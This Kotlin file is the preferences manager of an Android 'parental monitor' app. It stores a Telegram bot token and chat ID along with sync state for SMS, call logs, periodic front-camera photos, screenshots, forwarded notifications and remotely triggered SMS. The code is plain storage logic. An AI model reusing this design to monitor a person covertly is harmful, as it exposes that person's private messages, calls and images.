package com.redeye.parentalmonitor.data

import android.content.Context
import android.content.SharedPreferences
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

class PreferencesManager(context: Context) {

    private val appContext = context.applicationContext

    private val securePrefs: Pair<SharedPreferences, Boolean> = openPrefs(appContext)

    @Volatile
    private var storageEncrypted = securePrefs.second

    @Volatile
    private var sharedPreferences: SharedPreferences = securePrefs.first

    val isStorageEncrypted: Boolean
        get() = storageEncrypted

    private val listenerLock = Any()
    private val listenerSet = mutableSetOf<android.content.SharedPreferences.OnSharedPreferenceChangeListener>()

    private val upgradeLock = Any()

    fun upgradeToPersistent(): Boolean {
        if (storageEncrypted) return true
        synchronized(upgradeLock) {
            if (storageEncrypted) return true
            return try {
                val fresh = openEncryptedPrefs(appContext, PREFS_NAME)
                val snap = try { HashMap(snapshot()) } catch (_: Exception) { emptyMap<String, Any?>() }
                if (snap.isNotEmpty()) {
                    val editor = fresh.edit()
                    for ((key, value) in snap) {
                        putEntryInto(editor, key, value)
                    }
                    editor.commit()
                }
                sharedPreferences = fresh
                synchronized(listenerLock) {
                    for (l in listenerSet) {
                        try { fresh.registerOnSharedPreferenceChangeListener(l) } catch (_: Exception) { }
                    }
                }
                storageEncrypted = true
                true
            } catch (_: Exception) {
                false
            }
        }
    }

    private fun putEntryInto(editor: android.content.SharedPreferences.Editor, key: String, value: Any?) {
        when (value) {
            null -> editor.remove(key)
            is String -> editor.putString(key, value)
            is Int -> editor.putInt(key, value)
            is Long -> editor.putLong(key, value)
            is Float -> editor.putFloat(key, value)
            is Boolean -> editor.putBoolean(key, value)
            is Set<*> -> try {
                @Suppress("UNCHECKED_CAST")
                editor.putStringSet(key, value as Set<String>)
            } catch (_: Exception) {
            }
            else -> Unit
        }
    }

    companion object {
        @Volatile
        private var instance: PreferencesManager? = null

        fun getInstance(context: Context): PreferencesManager {
            return instance ?: synchronized(this) {
                instance ?: PreferencesManager(context.applicationContext).also { instance = it }
            }
        }

        @Volatile
        private var sharedMasterKey: MasterKey? = null

        fun getMasterKey(context: Context): MasterKey {
            return sharedMasterKey ?: synchronized(this) {
                sharedMasterKey ?: MasterKey.Builder(context.applicationContext)
                    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
                    .build()
                    .also { sharedMasterKey = it }
            }
        }

        private const val PREFS_NAME = "secure_prefs"

        private val secureRandom = java.security.SecureRandom()
        private val PAIR_CODE_REGEX = Regex("^[0-9]{6}$")

        private fun openPrefs(context: Context): Pair<SharedPreferences, Boolean> {
            if (android.os.Looper.myLooper() == android.os.Looper.getMainLooper()) {
                com.redeye.parentalmonitor.utils.Background.run {
                    try {
                        refreshInstance(context.applicationContext)
                    } catch (_: Exception) {
                    }
                }
                return Pair(MemoryPrefs(), false)
            }
            return try {
                Pair(openEncryptedPrefs(context, PREFS_NAME), true)
            } catch (e: Exception) {
                try {
                    synchronized(this) {
                        sharedMasterKey = null
                    }
                } catch (_: Exception) {
                }
                android.util.Log.w("PreferencesManager", "Encrypted prefs unavailable, using volatile memory", e)
                Pair(MemoryPrefs(), false)
            }
        }

        fun openEncryptedPrefs(context: Context, prefsName: String): SharedPreferences {
            try {
                return createEncryptedPrefs(context, prefsName)
            } catch (e: Exception) {
                try {
                    synchronized(this) {
                        sharedMasterKey = null
                    }
                } catch (_: Exception) {
                }
                throw e
            }
        }

        private fun createEncryptedPrefs(context: Context, prefsName: String): SharedPreferences {
            return EncryptedSharedPreferences.create(
                context.applicationContext,
                prefsName,
                getMasterKey(context),
                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        }

        const val KEY_BOT_TOKEN = "bot_token"
        const val KEY_CHAT_ID = "chat_id"
        const val KEY_MONITORING_ENABLED = "monitoring_enabled"
        private const val KEY_LAST_SYNC = "last_sync"
        const val KEY_SYNC_INTERVAL = "sync_interval"
        private const val KEY_LAST_SMS_ID = "last_sms_id"
        private const val KEY_LAST_CALL_TIMESTAMP = "last_call_timestamp"
        private const val KEY_LAST_CALL_ID = "last_call_id"
        const val KEY_USER_DISABLED = "user_disabled_monitoring"
        private const val KEY_INITIAL_SYNC_DONE = "initial_sync_done"
        private const val KEY_INITIAL_SYNC_STARTED = "initial_sync_started"
        const val KEY_CAMERA_INTERVAL = "camera_interval"
        private const val KEY_LAST_UPDATE_ID = "last_update_id"
        private const val KEY_WAKE_UPDATE_ID = "wake_update_id"
        private const val KEY_LAST_PHOTO_TIME = "last_photo_time"
        private const val KEY_LAST_CAM_ERR_NOTICE = "last_cam_err_notice"
        private const val KEY_LAST_UPLOAD_ERR_NOTICE = "last_upload_err_notice"
        const val KEY_MONITORING_PAUSED = "monitoring_paused"
        const val KEY_PHOTO_PAUSED_UNTIL = "photo_paused_until"
        const val KEY_PATROL_ENABLED = "patrol_enabled"
        const val KEY_PATROL_INTERVAL = "patrol_interval"
        private const val KEY_CAMERA_FACING = "camera_facing"
        const val KEY_USER_CONSENTED = "user_consented_monitoring"
        const val KEY_NOTIF_FORWARD = "notif_forward_enabled"
        const val KEY_CRED_ERROR = "credential_error"
        private const val KEY_CRED_ERROR_AT = "credential_error_at"
        private const val KEY_COMMANDS_TOKEN_HASH = "commands_token_hash"
        private const val KEY_RING_PREV_VOL = "ring_prev_volume"
        private const val KEY_RING_SAVED_AT = "ring_saved_at"
        private const val KEY_PENDING_SMS_NUMBER = "pending_sms_number"
        private const val KEY_PENDING_SMS_TEXT = "pending_sms_text"
        private const val KEY_PENDING_SMS_AT = "pending_sms_at"
        private const val KEY_PENDING_SMS_OWNER = "pending_sms_owner"
        private const val KEY_LAST_SMS_SEND_AT = "last_sms_send_at"
        private const val KEY_OWNER_ID = "owner_user_id"
        private const val KEY_OWNER_PAIR_CODE = "owner_pair_code"
        private const val KEY_WAKE_PING_IDS = "wake_ping_ids"
        private const val KEY_SCREENSHOT_RESULT_CODE = "screenshot_result_code"
        private const val KEY_SCREENSHOT_DATA = "screenshot_data"
        private const val KEY_PENDING_MSG_DROPS = "pending_msg_drops"
        private const val KEY_PENDING_NOTIF_DROPS = "pending_notif_drops"

        fun refreshInstance(context: Context): Boolean {
            synchronized(this) {
                val current = instance
                if (current != null) {
                    if (current.isStorageEncrypted) return true
                    return try {
                        if (current.upgradeToPersistent()) {
                            try {
                                val now = System.currentTimeMillis()
                                val errAt = current.credentialErrorAt
                                if (errAt != 0L && (now < errAt || now - errAt >= 30 * 60_000L)) {
                                    current.credentialError = ""
                                    current.credentialErrorAt = 0L
                                }
                            } catch (_: Exception) {
                            }
                            true
                        } else {
                            false
                        }
                    } catch (_: Exception) {
                        false
                    }
                }
                return try {
                    val created = PreferencesManager(context.applicationContext)
                    if (!created.isStorageEncrypted) {
                        if (instance == null) instance = created
                        return false
                    }
                    instance = created
                    try {
                        val now = System.currentTimeMillis()
                        val errAt = created.credentialErrorAt
                        if (errAt != 0L && (now < errAt || now - errAt >= 30 * 60_000L)) {
                            created.credentialError = ""
                            created.credentialErrorAt = 0L
                        }
                    } catch (_: Exception) {
                    }
                    true
                } catch (_: Exception) {
                    false
                }
            }
        }
    }

    var botToken: String
        get() = try { sharedPreferences.getString(KEY_BOT_TOKEN, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_BOT_TOKEN, value).apply()

    var chatId: String
        get() = try { sharedPreferences.getString(KEY_CHAT_ID, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_CHAT_ID, value).apply()

    var isMonitoringEnabled: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_MONITORING_ENABLED, false) } catch (_: Exception) { false }
        set(value) = sharedPreferences.edit().putBoolean(KEY_MONITORING_ENABLED, value).apply()

    var lastSyncTime: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_SYNC, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_SYNC, value).apply()

    var syncInterval: Int
        get() = try { sharedPreferences.getInt(KEY_SYNC_INTERVAL, com.redeye.parentalmonitor.BuildConfig.SYNC_INTERVAL) } catch (_: Exception) { com.redeye.parentalmonitor.BuildConfig.SYNC_INTERVAL }
        set(value) = sharedPreferences.edit().putInt(KEY_SYNC_INTERVAL, value).apply()

    var lastSmsId: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_SMS_ID, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_SMS_ID, value).apply()

    var lastCallTimestamp: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_CALL_TIMESTAMP, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_CALL_TIMESTAMP, value).apply()

    var lastCallId: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_CALL_ID, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_CALL_ID, value).apply()

    var userDisabledMonitoring: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_USER_DISABLED, false) } catch (_: Exception) { false }
        set(value) = sharedPreferences.edit().putBoolean(KEY_USER_DISABLED, value).apply()

    var initialSyncDone: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_INITIAL_SYNC_DONE, false) } catch (_: Exception) { false }
        set(value) = sharedPreferences.edit().putBoolean(KEY_INITIAL_SYNC_DONE, value).apply()

    fun setInitialSyncDoneSync(done: Boolean) {
        try {
            sharedPreferences.edit().putBoolean(KEY_INITIAL_SYNC_DONE, done).commit()
        } catch (_: Exception) {
        }
    }

    var initialSyncStarted: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_INITIAL_SYNC_STARTED, false) } catch (_: Exception) { false }
        set(value) = sharedPreferences.edit().putBoolean(KEY_INITIAL_SYNC_STARTED, value).apply()

    fun setInitialSyncStartedSync(started: Boolean) {
        try {
            sharedPreferences.edit().putBoolean(KEY_INITIAL_SYNC_STARTED, started).commit()
        } catch (_: Exception) {
        }
    }

    var cameraInterval: Int
        get() = try { sharedPreferences.getInt(KEY_CAMERA_INTERVAL, 1) } catch (_: Exception) { 1 }
        set(value) = sharedPreferences.edit().putInt(KEY_CAMERA_INTERVAL, value).apply()

    var lastUpdateId: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_UPDATE_ID, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_UPDATE_ID, value).apply()

    fun setLastUpdateIdSync(id: Long) {
        try {
            sharedPreferences.edit().putLong(KEY_LAST_UPDATE_ID, id).commit()
        } catch (_: Exception) {
        }
    }

    var wakeUpdateId: Long
        get() = try { sharedPreferences.getLong(KEY_WAKE_UPDATE_ID, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_WAKE_UPDATE_ID, value).apply()

    fun setWakeUpdateIdSync(id: Long) {
        try {
            sharedPreferences.edit().putLong(KEY_WAKE_UPDATE_ID, id).commit()
        } catch (_: Exception) {
        }
    }

    var lastPhotoTime: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_PHOTO_TIME, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_PHOTO_TIME, value).apply()

    var lastCameraErrorNotice: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_CAM_ERR_NOTICE, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_CAM_ERR_NOTICE, value).apply()

    var lastUploadErrorNotice: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_UPLOAD_ERR_NOTICE, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_UPLOAD_ERR_NOTICE, value).apply()

    var monitoringPaused: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_MONITORING_PAUSED, false) } catch (_: Exception) { false }
        set(value) = sharedPreferences.edit().putBoolean(KEY_MONITORING_PAUSED, value).apply()

    var photoPausedUntil: Long
        get() = try { sharedPreferences.getLong(KEY_PHOTO_PAUSED_UNTIL, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_PHOTO_PAUSED_UNTIL, value).apply()

    var patrolEnabled: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_PATROL_ENABLED, false) } catch (_: Exception) { false }
        set(value) = sharedPreferences.edit().putBoolean(KEY_PATROL_ENABLED, value).apply()

    var patrolInterval: Int
        get() = try { sharedPreferences.getInt(KEY_PATROL_INTERVAL, 30) } catch (_: Exception) { 30 }
        set(value) = sharedPreferences.edit().putInt(KEY_PATROL_INTERVAL, value).apply()

    var cameraFacing: String
        get() = try { sharedPreferences.getString(KEY_CAMERA_FACING, "front") ?: "front" } catch (_: Exception) { "front" }
        set(value) = sharedPreferences.edit().putString(KEY_CAMERA_FACING, value).apply()

    fun isConfigured(): Boolean {
        return try { botToken.isNotEmpty() && chatId.isNotEmpty() } catch (_: Exception) { false }
    }

    fun registerChangeListener(listener: android.content.SharedPreferences.OnSharedPreferenceChangeListener) {
        synchronized(listenerLock) { listenerSet.add(listener) }
        try { sharedPreferences.registerOnSharedPreferenceChangeListener(listener) } catch (_: Exception) { }
    }

    fun unregisterChangeListener(listener: android.content.SharedPreferences.OnSharedPreferenceChangeListener) {
        synchronized(listenerLock) { listenerSet.remove(listener) }
        try { sharedPreferences.unregisterOnSharedPreferenceChangeListener(listener) } catch (_: Exception) { }
    }

    fun snapshot(): Map<String, Any?> {
        return try {
            val raw = sharedPreferences.all
            val copy = HashMap<String, Any?>(raw.size)
            for ((k, v) in raw) {
                copy[k] = if (v is Set<*>) HashSet(v) else v
            }
            copy
        } catch (_: Exception) {
            emptyMap()
        }
    }

    var userConsentedMonitoring: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_USER_CONSENTED, false) } catch (_: Exception) { false }
        set(value) = sharedPreferences.edit().putBoolean(KEY_USER_CONSENTED, value).apply()

    var notifForwardEnabled: Boolean
        get() = try { sharedPreferences.getBoolean(KEY_NOTIF_FORWARD, true) } catch (_: Exception) { true }
        set(value) = sharedPreferences.edit().putBoolean(KEY_NOTIF_FORWARD, value).apply()

    var credentialError: String
        get() = try { sharedPreferences.getString(KEY_CRED_ERROR, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_CRED_ERROR, value).apply()

    var credentialErrorAt: Long
        get() = try { sharedPreferences.getLong(KEY_CRED_ERROR_AT, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_CRED_ERROR_AT, value).apply()

    var commandsTokenHash: String
        get() = try { sharedPreferences.getString(KEY_COMMANDS_TOKEN_HASH, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_COMMANDS_TOKEN_HASH, value).apply()

    var ringPrevVolume: Int
        get() = try { sharedPreferences.getInt(KEY_RING_PREV_VOL, -1) } catch (_: Exception) { -1 }
        set(value) = sharedPreferences.edit().putInt(KEY_RING_PREV_VOL, value).apply()

    var ringSavedAt: Long
        get() = try { sharedPreferences.getLong(KEY_RING_SAVED_AT, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_RING_SAVED_AT, value).apply()

    fun setRingStateSync(prev: Int, at: Long) {
        try {
            sharedPreferences.edit().putInt(KEY_RING_PREV_VOL, prev).putLong(KEY_RING_SAVED_AT, at).commit()
        } catch (_: Exception) {
        }
    }

    fun clearRingStateSync() {
        try {
            sharedPreferences.edit().putInt(KEY_RING_PREV_VOL, -1).putLong(KEY_RING_SAVED_AT, 0L).commit()
        } catch (_: Exception) {
        }
    }

    var pendingSmsNumber: String
        get() = try { sharedPreferences.getString(KEY_PENDING_SMS_NUMBER, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_PENDING_SMS_NUMBER, value).apply()

    var pendingSmsText: String
        get() = try { sharedPreferences.getString(KEY_PENDING_SMS_TEXT, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_PENDING_SMS_TEXT, value).apply()

    var pendingSmsAt: Long
        get() = try { sharedPreferences.getLong(KEY_PENDING_SMS_AT, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_PENDING_SMS_AT, value).apply()

    var lastSmsSendAt: Long
        get() = try { sharedPreferences.getLong(KEY_LAST_SMS_SEND_AT, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_LAST_SMS_SEND_AT, value).apply()

    var pendingSmsOwner: String
        get() = try { sharedPreferences.getString(KEY_PENDING_SMS_OWNER, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_PENDING_SMS_OWNER, value).apply()

    var ownerUserId: Long
        get() = try { sharedPreferences.getLong(KEY_OWNER_ID, 0L) } catch (_: Exception) { 0L }
        set(value) = sharedPreferences.edit().putLong(KEY_OWNER_ID, value).apply()

    fun setOwnerIdSync(id: Long) {
        try {
            sharedPreferences.edit().putLong(KEY_OWNER_ID, id).commit()
        } catch (_: Exception) {
        }
    }

    var ownerPairCode: String
        get() = try { sharedPreferences.getString(KEY_OWNER_PAIR_CODE, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_OWNER_PAIR_CODE, value).apply()

    fun ensureOwnerPairCode(): String {
        try {
            val cur = try { sharedPreferences.getString(KEY_OWNER_PAIR_CODE, "") ?: "" } catch (_: Exception) { "" }
            if (cur.matches(PAIR_CODE_REGEX)) return cur
            val code = (100000 + secureRandom.nextInt(900000)).toString()
            try {
                sharedPreferences.edit().putString(KEY_OWNER_PAIR_CODE, code).commit()
            } catch (_: Exception) {
                return code
            }
            return try { sharedPreferences.getString(KEY_OWNER_PAIR_CODE, "") ?: code } catch (_: Exception) { code }
        } catch (_: Exception) {
            return ""
        }
    }

    var pendingMsgDrops: Int
        get() = try { sharedPreferences.getInt(KEY_PENDING_MSG_DROPS, 0) } catch (_: Exception) { 0 }
        set(value) = sharedPreferences.edit().putInt(KEY_PENDING_MSG_DROPS, value).apply()

    fun setPendingMsgDropsSync(value: Int) {
        try {
            sharedPreferences.edit().putInt(KEY_PENDING_MSG_DROPS, value).commit()
        } catch (_: Exception) {
        }
    }

    var pendingNotifDrops: Int
        get() = try { sharedPreferences.getInt(KEY_PENDING_NOTIF_DROPS, 0) } catch (_: Exception) { 0 }
        set(value) = sharedPreferences.edit().putInt(KEY_PENDING_NOTIF_DROPS, value).apply()

    fun setPendingNotifDropsSync(value: Int) {
        try {
            sharedPreferences.edit().putInt(KEY_PENDING_NOTIF_DROPS, value).commit()
        } catch (_: Exception) {
        }
    }

    private fun readWakePingIds(): MutableSet<Long> {
        return try {
            sharedPreferences.getString(KEY_WAKE_PING_IDS, "")
                ?.split(",")
                ?.mapNotNull { it.toLongOrNull() }
                ?.toMutableSet() ?: mutableSetOf()
        } catch (_: Exception) {
            mutableSetOf()
        }
    }

    private fun writeWakePingIds(ids: Collection<Long>) {
        try {
            val capped = ids.sorted().takeLast(50)
            sharedPreferences.edit().putString(KEY_WAKE_PING_IDS, capped.joinToString(",")).apply()
        } catch (_: Exception) {
        }
    }

    fun addWakePingIds(ids: Collection<Long>) {
        if (ids.isEmpty()) return
        try {
            val cur = readWakePingIds()
            cur.addAll(ids)
            writeWakePingIds(cur)
        } catch (_: Exception) {
        }
    }

    fun writeSmsPendingSync(number: String, text: String, at: Long, owner: String) {
        try {
            sharedPreferences.edit()
                .putString(KEY_PENDING_SMS_NUMBER, number)
                .putString(KEY_PENDING_SMS_TEXT, text)
                .putLong(KEY_PENDING_SMS_AT, at)
                .putString(KEY_PENDING_SMS_OWNER, owner)
                .commit()
        } catch (_: Exception) {
        }
    }

    fun clearSmsPendingIf(at: Long) {
        try {
            if (sharedPreferences.getLong(KEY_PENDING_SMS_AT, 0L) == at) {
                sharedPreferences.edit()
                    .putString(KEY_PENDING_SMS_NUMBER, "")
                    .putString(KEY_PENDING_SMS_TEXT, "")
                    .putLong(KEY_PENDING_SMS_AT, 0L)
                    .putString(KEY_PENDING_SMS_OWNER, "")
                    .commit()
            }
        } catch (_: Exception) {
        }
    }

    fun touchSmsPendingSync(at: Long) {
        try {
            sharedPreferences.edit().putLong(KEY_PENDING_SMS_AT, at).commit()
        } catch (_: Exception) {
        }
    }

    fun setSmsCursorSync(id: Long) {
        try {
            sharedPreferences.edit().putLong(KEY_LAST_SMS_ID, id).commit()
        } catch (_: Exception) {
        }
    }

    fun setCallCursorSync(timestamp: Long, id: Long) {
        try {
            sharedPreferences.edit().putLong(KEY_LAST_CALL_TIMESTAMP, timestamp).putLong(KEY_LAST_CALL_ID, id).commit()
        } catch (_: Exception) {
        }
    }

    fun setLastSmsSendAtSync(now: Long) {
        try {
            sharedPreferences.edit().putLong(KEY_LAST_SMS_SEND_AT, now).commit()
        } catch (_: Exception) {
        }
    }

    fun wakePingSeen(updateId: Long): Boolean {
        return try {
            readWakePingIds().contains(updateId)
        } catch (_: Exception) {
            false
        }
    }

    fun clearWakePingIds() {
        try {
            sharedPreferences.edit().remove(KEY_WAKE_PING_IDS).apply()
        } catch (_: Exception) {
        }
    }

    fun removeWakePingId(updateId: Long) {
        try {
            val cur = readWakePingIds()
            if (cur.remove(updateId)) writeWakePingIds(cur)
        } catch (_: Exception) {
        }
    }

    var screenshotResultCode: Int
        get() = try { sharedPreferences.getInt(KEY_SCREENSHOT_RESULT_CODE, 0) } catch (_: Exception) { 0 }
        set(value) = sharedPreferences.edit().putInt(KEY_SCREENSHOT_RESULT_CODE, value).apply()

    var screenshotData: String
        get() = try { sharedPreferences.getString(KEY_SCREENSHOT_DATA, "") ?: "" } catch (_: Exception) { "" }
        set(value) = sharedPreferences.edit().putString(KEY_SCREENSHOT_DATA, value).apply()

    fun saveScreenshotConsentSync(code: Int, dataUri: String) {
        try {
            sharedPreferences.edit().putInt(KEY_SCREENSHOT_RESULT_CODE, code).putString(KEY_SCREENSHOT_DATA, dataUri).commit()
        } catch (_: Exception) {
        }
    }

    fun clearScreenshotConsentSync() {
        try {
            sharedPreferences.edit().remove(KEY_SCREENSHOT_RESULT_CODE).remove(KEY_SCREENSHOT_DATA).commit()
        } catch (_: Exception) {
        }
    }

    fun hasScreenshotConsent(): Boolean {
        return try { screenshotResultCode != 0 && screenshotData.isNotEmpty() } catch (_: Exception) { false }
    }

    private fun putCredentialState(editor: android.content.SharedPreferences.Editor, newToken: String, newChatId: String) {
        val changed = try {
            newToken != botToken || newChatId != chatId
        } catch (_: Exception) {
            true
        }
        val tokenChanged = try { newToken != botToken } catch (_: Exception) { true }
        val chatChanged = try { newChatId != chatId } catch (_: Exception) { true }
        if (changed) {
            editor.putString(KEY_COMMANDS_TOKEN_HASH, "")
            editor.putString(KEY_OWNER_PAIR_CODE, "")
        }
        if (chatChanged || tokenChanged) {
            editor.putLong(KEY_OWNER_ID, 0L)
        }
        editor.putString(KEY_CRED_ERROR, "")
        editor.putLong(KEY_CRED_ERROR_AT, 0L)
        if (tokenChanged) {
            editor.remove(KEY_WAKE_PING_IDS)
        }
    }

    fun saveCoreConfig(newToken: String, newChatId: String, newSyncInterval: Int, newCameraInterval: Int) {
        saveCredentials(newToken, newChatId, newSyncInterval, newCameraInterval)
    }

    fun saveTestCredentials(newToken: String, newChatId: String, newSyncInterval: Int, newCameraInterval: Int) {
        saveCredentials(newToken, newChatId, newSyncInterval, newCameraInterval)
    }

    private fun saveCredentials(newToken: String, newChatId: String, newSyncInterval: Int, newCameraInterval: Int) {
        try { upgradeToPersistent() } catch (_: Exception) { }
        val editor = sharedPreferences.edit()
        putCredentialState(editor, newToken, newChatId)
        editor.putString(KEY_BOT_TOKEN, newToken)
        editor.putString(KEY_CHAT_ID, newChatId)
        editor.putInt(KEY_SYNC_INTERVAL, newSyncInterval)
        editor.putInt(KEY_CAMERA_INTERVAL, newCameraInterval)
        try { editor.commit() } catch (_: Exception) { try { editor.apply() } catch (_: Exception) { } }
    }

    fun setMonitoringActive(active: Boolean) {
        val editor = sharedPreferences.edit()
        editor.putBoolean(KEY_MONITORING_ENABLED, active)
        if (active) {
            editor.putBoolean(KEY_USER_DISABLED, false)
            editor.putBoolean(KEY_USER_CONSENTED, true)
            editor.putBoolean(KEY_MONITORING_PAUSED, false)
            editor.putLong(KEY_PHOTO_PAUSED_UNTIL, 0L)
        } else {
            editor.putBoolean(KEY_USER_DISABLED, true)
        }
        editor.apply()
    }

private class MemoryPrefs : SharedPreferences {
    private val data = java.util.concurrent.ConcurrentHashMap<String, Any?>()
    private val listeners = mutableSetOf<SharedPreferences.OnSharedPreferenceChangeListener>()
    override fun getAll(): Map<String, *> = HashMap(data)
    override fun getString(key: String, defValue: String?): String? = data[key] as? String ?: defValue
    override fun getStringSet(key: String, defValues: Set<String>?): Set<String>? {
        @Suppress("UNCHECKED_CAST")
        val stored = data[key] as? Set<String>
        return if (stored != null) HashSet(stored) else defValues
    }
    override fun getInt(key: String, defValue: Int): Int = data[key] as? Int ?: defValue
    override fun getLong(key: String, defValue: Long): Long = data[key] as? Long ?: defValue
    override fun getFloat(key: String, defValue: Float): Float = data[key] as? Float ?: defValue
    override fun getBoolean(key: String, defValue: Boolean): Boolean = data[key] as? Boolean ?: defValue
    override fun contains(key: String): Boolean = data.containsKey(key)
    override fun edit(): SharedPreferences.Editor = MemoryEditor()
    override fun registerOnSharedPreferenceChangeListener(listener: SharedPreferences.OnSharedPreferenceChangeListener) {
        synchronized(listeners) { listeners.add(listener) }
    }
    override fun unregisterOnSharedPreferenceChangeListener(listener: SharedPreferences.OnSharedPreferenceChangeListener) {
        synchronized(listeners) { listeners.remove(listener) }
    }
    private inner class MemoryEditor : SharedPreferences.Editor {
        private val pending = HashMap<String, Any?>()
        private var clearAll = false
        override fun putString(key: String, value: String?): SharedPreferences.Editor = apply { pending[key] = value }
        override fun putStringSet(key: String, values: Set<String>?): SharedPreferences.Editor = apply { pending[key] = if (values != null) HashSet(values) else null }
        override fun putInt(key: String, value: Int): SharedPreferences.Editor = apply { pending[key] = value }
        override fun putLong(key: String, value: Long): SharedPreferences.Editor = apply { pending[key] = value }
        override fun putFloat(key: String, value: Float): SharedPreferences.Editor = apply { pending[key] = value }
        override fun putBoolean(key: String, value: Boolean): SharedPreferences.Editor = apply { pending[key] = value }
        override fun remove(key: String): SharedPreferences.Editor = apply { pending[key] = null }
        override fun clear(): SharedPreferences.Editor = apply { clearAll = true }
        override fun commit(): Boolean {
            apply()
            return true
        }
        override fun apply() {
            if (clearAll) data.clear()
            for ((k, v) in pending) {
                if (v == null) data.remove(k) else data[k] = v
            }
            val changed = HashSet(pending.keys)
            pending.clear()
            clearAll = false
            val copy = synchronized(listeners) { ArrayList(listeners) }
            for (l in copy) {
                for (k in changed) {
                    try { l.onSharedPreferenceChanged(this@MemoryPrefs, k) } catch (_: Exception) { }
                }
            }
        }
    }
}
}
